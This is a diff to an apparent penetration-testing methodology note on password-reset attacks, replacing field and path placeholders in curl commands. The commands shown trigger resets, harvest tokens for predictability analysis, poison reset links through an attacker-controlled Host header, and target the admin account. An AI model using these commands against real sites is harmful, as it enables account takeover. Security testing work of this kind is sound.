@@ -1,8 +1,6 @@
 
 Attacks against password-reset flows. Entry from [[Web Attack Checksheet]] sub-block 1.8 on forgot-password form observation.
 
-Sister files: [[Credential Attacks]] (credential attacks against login), [[Login Bypass Techniques]] (login bypass), [[Username Enumeration]] (enumerate via reset form).
-
 Ordering: fast checks first (obtain token, inspect for predictability); token attacks (prediction, reuse); reset URL manipulation (parameter tampering); host header / password reset poisoning (medium cost, requires attacker-controlled host); reset flow logic flaws (case sensitivity, sequence bypass); security question weakness. On successful reset → login as target user → route to [[Credential Attacks]] Section 6 (post-success routing).
 
 ---
@@ -12,7 +10,7 @@ Ordering: fast checks first (obtain token, inspect for predictability); token at
 Attacks in Sections 1-4 require obtaining at least one reset token to analyse. Trigger reset for a user you control (register test account first via [[Registration Attacks]] if needed; else use a known-valid username from [[Username Enumeration]] output).
 
 ```bash
-curl -sX POST -i -d 'username=<test_user>' http://<host>:<port>/<reset_path>
+curl -sX POST -i -d '<forgot_identifier_field>=<test_user>' http://<host>:<port>/<forgot_form_action>
 ```
 
 Reset delivery mechanism:
@@ -40,7 +38,7 @@ Capture 3-5 tokens (trigger reset multiple times, or across multiple test accoun
 
 ```bash
 for i in 1 2 3 4 5; do
-  curl -sX POST -d "username=<test_user>_$i" http://<host>:<port>/<reset_path> >/dev/null
+    curl -sX POST -d "<forgot_identifier_field>=<test_user>_$i" http://<host>:<port>/<forgot_form_action> >/dev/null
   # Retrieve token from email/response, log to file
 done
 ```
@@ -130,7 +128,7 @@ If reset link generation uses the request's `Host` header (or `X-Forwarded-Host`
 **Attack — inject host header:**
 
 ```bash
-curl -sX POST -H 'Host: <attacker_host>' -H 'X-Forwarded-Host: <attacker_host>' -d 'username=<target_user>' http://<host>:<port>/<reset_path>
+curl -sX POST -H 'Host: <attacker_host>' -H 'X-Forwarded-Host: <attacker_host>' -d '<forgot_identifier_field>=<target_user>' http://<host>:<port>/<forgot_form_action>
 ```
 
 **Also try:**
@@ -164,7 +162,7 @@ Some apps compare case-sensitively for auth but case-insensitively for user look
 
 **Reset for username=admin.** Trigger reset directly for admin:
 
-`curl -sX POST -d 'username=admin' http://<host>:<port>/<reset_path>`
+`curl -sX POST -d '<forgot_identifier_field>=admin' http://<host>:<port>/<forgot_form_action>`
 
 If reset link is displayed on-screen or in HTTP response (misconfigured dev/lab environments), grab it directly.
 
